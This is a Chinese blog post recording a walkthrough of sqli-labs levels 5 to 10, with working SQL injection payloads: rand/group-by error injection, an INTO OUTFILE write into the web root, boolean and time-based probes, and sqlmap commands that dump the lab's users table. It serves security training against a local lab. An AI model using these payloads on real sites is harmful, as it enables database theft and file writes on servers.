<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 开始 sqli-labs 的第二轮训练。 !!!ATTENTION!!! 在 MySQL 5.7.36 更新中，修复了 group by 报错 Duplicate entry '0' for key '&amp;lt;group_key&amp;gt;' 的问题。 Changes in MySQL 5.7.36 (2021-10-19, General Availability) When a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item"><title>sqli-labs 实验记录 #2</title><link rel=canonical href=https://nnnewb.github.io/blog/p/sqli-labs-training-2/><link rel=stylesheet href=/blog/scss/style.min.709d4f89582c5a09dc94158a722a16093cdffe24d9a8c77dd3f422c786203c41.css><script src=https://unpkg.com/dayjs@1.8.21/dayjs.min.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/plugin/relativeTime.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/locale/zh-cn.js></script>
<script>dayjs.locale("zh-cn"),dayjs.extend(dayjs_plugin_relativeTime)</script><meta property="og:title" content="sqli-labs 实验记录 #2"><meta property="og:description" content="前言 开始 sqli-labs 的第二轮训练。 !!!ATTENTION!!! 在 MySQL 5.7.36 更新中，修复了 group by 报错 Duplicate entry '0' for key '&amp;lt;group_key&amp;gt;' 的问题。 Changes in MySQL 5.7.36 (2021-10-19, General Availability) When a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item"><meta property="og:url" content="https://nnnewb.github.io/blog/p/sqli-labs-training-2/"><meta property="og:site_name" content="weakptr's 笔记"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="sqli"><meta property="article:tag" content="sqli-labs"><meta property="article:published_time" content="2022-05-10T15:14:45+08:00"><meta property="article:modified_time" content="2022-05-10T15:14:45+08:00"><meta name=twitter:title content="sqli-labs 实验记录 #2"><meta name=twitter:description content="前言 开始 sqli-labs 的第二轮训练。 !!!ATTENTION!!! 在 MySQL 5.7.36 更新中，修复了 group by 报错 Duplicate entry '0' for key '&amp;lt;group_key&amp;gt;' 的问题。 Changes in MySQL 5.7.36 (2021-10-19, General Availability) When a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.setItem(e,"light")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/blog/><img src=/blog/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>🍑</span></figure><div class=site-meta><h1 class=site-name><a href=/blog>weakptr's 笔记</a></h1><h2 class=site-description>弃船！</h2></div></header><ol class=social-menu><li><a href=https://github.com/nnnewb/ target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/blog/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>首页</span></a></li><li><a href=/blog/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>关于我</span></a></li><li><a href=/blog/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>归档</span></a></li><li><a href=/blog/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg><span>分类</span></a></li><li><a href=/blog/tags><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11 3l9 9a1.5 1.5.0 010 2l-6 6a1.5 1.5.0 01-2 0L3 11V7a4 4 0 014-4h4"/><circle cx="9" cy="9" r="2"/></svg><span>标签</span></a></li><li><a href=/blog/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>友链</span></a></li><li><a href=/blog/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>搜索</span></a></li><div class=menu-bottom-section></div></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/blog/categories/security/>security</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/blog/p/sqli-labs-training-2/>sqli-labs 实验记录 #2</a></h2></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published datetime=2022-05-10T15:14:45+08:00>2022年 5月 10日</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>阅读时长: 5 分钟</time></div></footer></div></header><section class=article-content><h2 id=前言>前言</h2><p>开始 sqli-labs 的第二轮训练。</p><blockquote><p><strong>!!!ATTENTION!!!</strong></p><p>在 MySQL 5.7.36 更新中，修复了 group by 报错 <code>Duplicate entry '0' for key '&lt;group_key>'</code> 的问题。</p><blockquote><p><a class=link href=https://dev.mysql.com/doc/relnotes/mysql/5.7/en/news-5-7-36.html target=_blank rel=noopener>Changes in MySQL 5.7.36 (2021-10-19, General Availability)</a></p><p>When a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item value is already present, the row is updated; otherwise, a new row is inserted into the temporary table. If the item has a result field or reference item, it it evaluated twice, once to check whether the result exists in the temporary table and, if not, again while constructing the row to be inserted. When the group by item was nondeterministic, the result value used to check for existence differed from that with which an insert was attempted, causing the insert to be rejected if the value already existed in the table.</p><p>We fix this by using the hash of any nondeterministic items as the unique constraint, so that the hash is evaluated once only. (Bug #32552332)</p></blockquote><p>使用的 MySQL 版本 >=5.7.36 时，Less 5 和 Less 6 使用的 <code>select count(*), concat(version(), '~', floor(rand(14)*2)) x from user group by x;</code> 不会再报错。这个利用被彻底堵死了。</p></blockquote><h2 id=less-5-error-based-double-query>Less-5 Error-Based Double Query</h2><h3 id=原理>原理</h3><p>有一篇<a class=link href=https://blog.werner.wiki/principle-of-double-injection-in-mysql/ target=_blank rel=noopener>很好的文章</a>解释了这里的 Double Injection 指的是什么。我尽量概括一下。</p><p>先忽略 <em>Double Injection</em> 这个不明所以的名字，它代表技术原理的是利用 <code>group by &lt;col></code> 产生临时表，<code>col</code> 在临时表有唯一性约束，而 MySQL 在违反唯一性约束的错误信息里会提示违反唯一性的<code>col</code>内容是什么，由此产生信息泄露。</p><p>以一个案例来解释。下面的查询里<code>version()</code>是想爆的列，<code>concat(...)</code>连接目标列和随机数序列构造一个尽可能快出现冲突的<code>group key</code>。<code>floor(rand(14)*2)</code>产生的序列前四个结果是<code>1,0,1,0</code>，插入过程会产生两个<code>rand</code>调用（一次检查是否存在，一次插入新行），所以可以看成第一次查询<code>1</code>不存在，插入<code>0</code>；第二次查询<code>1</code>不存在，插入<code>0</code>，报错违反唯一性约束。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=s1>&#39;~&#39;</span><span class=p>,</span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>14</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>其中一个比较有趣的点是为什么要用<code>rand</code>，能不能写一个固定值？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=s1>&#39;~&#39;</span><span class=p>,</span><span class=s1>&#39;hello&#39;</span><span class=p>)</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>不行，这样做等于<code>group by</code>常量或者一个列，和普通<code>group by</code>没区别。<code>rand</code>发挥的关键作用是扰乱插入更新/插入临时表的过程。这个过程可以理解成这样：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=k>if</span> <span class=p>!</span><span class=nf>update</span><span class=p>(</span><span class=nx>group_key</span><span class=p>,</span> <span class=nx>tally</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>insert</span><span class=p>(</span><span class=nx>group_key</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>不使用<code>rand</code>时<code>update</code>和<code>insert</code>接收的就是同一个<code>group_key</code>，使用<code>rand</code>后<code>update</code>和<code>insert</code>就可能用的不是同一个<code>group_key</code>了，导致进入<code>insert</code>时插入的是已存在的<code>group_key</code>。</p><p>另一个有趣的问题是为什么要有<code>count(*)</code>？去掉<code>count(*)</code>就会导致不再报错。</p><p>等大佬解释。</p><h3 id=题解>题解</h3><p><code>?id=1' union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20</code></p><p><img src=/blog/p/sqli-labs-training-2/image-20220510135044215.png width=974 height=215 srcset="/blog/p/sqli-labs-training-2/image-20220510135044215_huefffb63b6882b93af83cdf945098e6c1_14004_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-2/image-20220510135044215_huefffb63b6882b93af83cdf945098e6c1_14004_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220510135044215 class=gallery-image data-flex-grow=453 data-flex-basis=1087px></p><blockquote><p><strong>Attention：</strong> MySQL版本 >=5.7.36 这个解法彻底失效。目前搜索 Double Injection 只有这一个解，如果有别的思路务必告知我。</p></blockquote><h2 id=less-6-error-based-double-query>Less-6 Error-Based Double Query</h2><p>和 Less-5 的区别只在于从单引号换成了双引号。稍微改一改 payload：<code>?id=1" union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20</code></p><p><img src=/blog/p/sqli-labs-training-2/image-20220510140208135.png width=1107 height=326 srcset="/blog/p/sqli-labs-training-2/image-20220510140208135_hu3235d36ba755a563f151709800b5bf17_176469_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-2/image-20220510140208135_hu3235d36ba755a563f151709800b5bf17_176469_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220510140208135 class=gallery-image data-flex-grow=339 data-flex-basis=814px></p><h2 id=less-7-dump-into-outfile>Less-7 Dump into Outfile</h2><blockquote><p>**注意：**这题不要求 Error-Based 了，请注意。</p></blockquote><h3 id=原理-1>原理</h3><p>简而言之，两个方面：</p><ol><li>利用 MySQL 的 <code>select ... into outfile|dumpfile &lt;filepath></code> 语法把查询结果保存到文件。</li><li>利用 MySQL 的 <code>LOAD DATA</code> 和 <code>LOAD XML</code> 语句读出任意文件内容。</li></ol><p>第一点可以用作覆盖磁盘上任意文件，通过 SQL 注入实现写入 webshell 或 crontab 等恶意行为。</p><p>第二点可以从 SQL 注入扩展到任意文件读取，MySQL 权限足够情况下可以拿到很多敏感文件内容。</p><h3 id=题解-1>题解</h3><p>本题没有回显，虽然可以按盲注爆破，但题目提示是使用 <code>outfile</code>。所以最简单的解法就是两步走。</p><ol><li>注入 <code>SELECT ... INTO DUMPFILE</code> 导出结果到文件。</li><li>注入 <code>LOAD DATA</code> 进而拿到结果。</li></ol><p>先确认注入类型：</p><ul><li><code>?id=1 and 1=0;--%20</code> 无效</li><li><code>?id=1' and 1=0;--%20</code> 报错</li><li><code>?id=1" and 1=0;--%20</code> 无效</li></ul><p><img src=/blog/p/sqli-labs-training-2/image-20220510142759400.png width=1106 height=320 srcset="/blog/p/sqli-labs-training-2/image-20220510142759400_hu90d926b5d54057f8970fc3576c37f315_170496_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-2/image-20220510142759400_hu90d926b5d54057f8970fc3576c37f315_170496_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220510142759400 class=gallery-image data-flex-grow=345 data-flex-basis=829px></p><p>所以是字符型注入，但SQL语句未知，尝试补括号：<code>?id=1') and 1=1;--%20</code>，依然报错，补两个括号后发现变正常：<code>?id=1')) and 1=1;--%20</code>。完成注入类型确认。</p><p><img src=/blog/p/sqli-labs-training-2/image-20220510142812936.png width=1100 height=337 srcset="/blog/p/sqli-labs-training-2/image-20220510142812936_hu533210a05faa9fed51aaf9b592243e88_170433_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-2/image-20220510142812936_hu533210a05faa9fed51aaf9b592243e88_170433_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220510142812936 class=gallery-image data-flex-grow=326 data-flex-basis=783px></p><p>接着把<code>and</code>条件去掉，改成<code>into outfile '/var/www/html/dump.txt'</code>，完整 payload：<code>?id=1')) into outfile '/var/www/html/dump.txt';--%20</code></p><blockquote><p>**注意：**docker方式部署请注意，MySQL 镜像默认启用了 <code>--secure-file-priv</code> 选项，这个选项会禁用 <code>select .. into outfile|dumpfile</code>，使注入的SQL执行失败。</p><p>**注意：**docker-compose 方式部署的 sqli-labs 如果把 MySQL 和 PHP+Apache 分开部署，即使<code>select ... into outfile ...</code> 成功，也无法直接通过 HTTP 方式下载，这一利用也无法继续下去。</p></blockquote><p>上述注入如果成功的话可以直接访问 <code>http://localhost:8080/dump.txt</code> 下载到查询结果了。</p><h2 id=less-8-blind-boolian>Less-8 Blind Boolian</h2><p>题目是布尔盲注。确认 SQL 注入类型：<code>?id=1' and 1=1;--%20</code>。</p><p><img src=/blog/p/sqli-labs-training-2/image-20220510144442127.png width=1135 height=335 srcset="/blog/p/sqli-labs-training-2/image-20220510144442127_hubb7b3bb8e10f6c5b3b4cc27acdc84c09_176762_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-2/image-20220510144442127_hubb7b3bb8e10f6c5b3b4cc27acdc84c09_176762_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220510144442127 class=gallery-image data-flex-grow=338 data-flex-basis=813px></p><p>典型的盲注，不自己动手了，接下来直接上 sqlmap。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -u <span class=s1>&#39;http://localhost/Less-8/?id=1&#39;</span> --technique B -p id -T users --dump
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Database: security
</span></span><span class=line><span class=cl>Table: users
</span></span><span class=line><span class=cl>[13 entries]
</span></span><span class=line><span class=cl>+------+----------+------------+
</span></span><span class=line><span class=cl>| id   | username | password   |
</span></span><span class=line><span class=cl>+------+----------+------------+
</span></span><span class=line><span class=cl>| 1    | Dumb     | Dumb       |
</span></span><span class=line><span class=cl>| 2    | Angelina | I-kill-you |
</span></span><span class=line><span class=cl>| 3    | Dummy    | p@ssword   |
</span></span><span class=line><span class=cl>| 4    | secure   | crappy     |
</span></span><span class=line><span class=cl>| 5    | stupid   | stupidity  |
</span></span><span class=line><span class=cl>| 6    | superman | genious    |
</span></span><span class=line><span class=cl>| 7    | batman   | mob!le     |
</span></span><span class=line><span class=cl>| 8    | admin    | admin      |
</span></span><span class=line><span class=cl>| 9    | admin1   | admin1     |
</span></span><span class=line><span class=cl>| 10   | admin2   | admin2     |
</span></span><span class=line><span class=cl>| 11   | admin3   | admin3     |
</span></span><span class=line><span class=cl>| 12   | dhakkan  | dumbo      |
</span></span><span class=line><span class=cl>| 14   | admin4   | admin4     |
</span></span><span class=line><span class=cl>+------+----------+------------+
</span></span></code></pre></td></tr></table></div></div><p>done。</p><h2 id=less-9-blind-time-based>Less-9 Blind Time-Based</h2><p>基于时间的盲注，先测试注入类型：<code>?id=1' and sleep(1);--%20</code></p><p><img src=/blog/p/sqli-labs-training-2/image-20220510145029175.png width=415 height=322 srcset="/blog/p/sqli-labs-training-2/image-20220510145029175_hu1ff0051e63321d97d122d24466263499_14007_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-2/image-20220510145029175_hu1ff0051e63321d97d122d24466263499_14007_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220510145029175 class=gallery-image data-flex-grow=128 data-flex-basis=309px></p><p>确认注入类型成功。接着还是上 sqlmap。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -u <span class=s1>&#39;http://localhost/Less-9/?id=1&#39;</span> --technique T -p id -T users --dump --count <span class=m>1</span>
</span></span></code></pre></td></tr></table></div></div><p>基于时间的盲注非常慢，即使 sqlmap 做了优化，依然非常慢，所以只提取一行。我懒得等就直接 ctrl+c 了。总之，就到这里结束。</p><h2 id=less-10-blind-time-based-doublequotes>Less-10 Blind Time-Based DoubleQuotes</h2><p>和 Less-9 一样，换成了双引号。<code>sqlmap</code>需要加上<code>--level 2</code>参数，让 <code>sqlmap</code> 更努力一点。</p><h2 id=总结>总结</h2><p>两个知识点一个教训。</p><p>知识点：</p><ol><li><code>rand</code>结合<code>group by</code>实现报错注入，不过遗憾的是 MySQL 5.7.36 修复了，将来这个技巧算废了。</li><li><code>select ... into outfile|dumpfile</code>和<code>load data</code>。对MySQL和php分开部署的情况能导出不能下载，MySQL容器默认禁止了文件权限，无法利用。</li></ol><p>教训则是接受失败和耐心尝试。尝试 Less-7 的时候，因为多出来的两个右括号，第一次补右括号无效后我差点就放弃尝试直接去看源码了。后来不抱什么希望再补了一个右括号，发现成功了的时候真的很惊喜，甚至有点庆幸。这也算是一次对自己的惰性的胜利吧。</p><p>虽然啥也没干还是辛苦我自己了。</p></section><footer class=article-footer><section class=article-tags><a href=/blog/tags/security/>security</a>
<a href=/blog/tags/sqli/>sqli</a>
<a href=/blog/tags/sqli-labs/>sqli-labs</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script></article><aside class=related-contents--wrapper><h2 class=section-title>相关文章</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/blog/p/sqli-labs-training-5/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>sqli-labs 实验记录 #5</h2></div></a></article><article><a href=/blog/p/sqli-labs-training-4/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>sqli-labs 实验记录 #4</h2></div></a></article><article><a href=/blog/p/sqli-labs-training-3/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>sqli-labs 实验记录 #3</h2></div></a></article><article><a href=/blog/p/sqli-labs-training-1/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>sqli-labs 实验记录 #1</h2></div></a></article><article><a href=/blog/p/redtiger-lab-training-note-2022-05-06/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>red tiger 打靶日志</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2021 -
2024 weakptr's 笔记</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计
，由 <a href=https://nnnewb.github.io/blog/>nnnewb</a> 修改</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#前言>前言</a></li><li><a href=#less-5-error-based-double-query>Less-5 Error-Based Double Query</a><ol><li><a href=#原理>原理</a></li><li><a href=#题解>题解</a></li></ol></li><li><a href=#less-6-error-based-double-query>Less-6 Error-Based Double Query</a></li><li><a href=#less-7-dump-into-outfile>Less-7 Dump into Outfile</a><ol><li><a href=#原理-1>原理</a></li><li><a href=#题解-1>题解</a></li></ol></li><li><a href=#less-8-blind-boolian>Less-8 Blind Boolian</a></li><li><a href=#less-9-blind-time-based>Less-9 Blind Time-Based</a></li><li><a href=#less-10-blind-time-based-doublequotes>Less-10 Blind Time-Based DoubleQuotes</a></li><li><a href=#总结>总结</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script 